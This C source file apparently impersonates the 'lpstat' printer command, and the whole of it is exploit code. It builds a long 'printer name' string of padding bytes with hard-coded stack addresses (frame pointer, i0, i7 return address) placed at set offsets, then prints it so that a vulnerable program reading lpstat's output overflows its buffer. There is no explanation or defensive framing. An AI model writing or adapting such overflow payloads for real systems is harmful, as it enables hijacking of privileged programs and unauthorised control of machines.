#include <stdio.h>
#define SIZE 290

void
usage()
{
 fprintf(stderr,"called with no arguments\n");
 exit(-1);
}

int 
main(int argc,char **argv) {
 
char name[SIZE];   /* printer name */ 

memset(name,0x00,sizeof(name)); /*clear with zeros*/
memset(name,0x41,SIZE);
memset(name+246,0x42,44);

/* frame pointer 0xffbe3690 */
name[268]=0xff;
name[269]=0xbe;
name[270]=0x36;
name[271]=0x90;

/* i0 0xffbe2438 */
name[244]=0xff;
name[245]=0xbe;
name[246]=0x24;
name[247]=0x38;

/*i7 0xffbeec44 */
name[272]=0xff;
name[273]=0xbe;
name[274]=0xec;
name[275]=0x44;
name[276]=0x00;

if(argc<2) {
  usage();
}

if(!strcmp(argv[1],"-v"))
{
   fprintf(stderr,"lpstat called with -v\n");
   printf("device for %s: /dev/null\n",name);
}
else
{
   fprintf(stderr,"lpstat called with -d\n");
   printf("system default destination: %s\n",name);
}

}
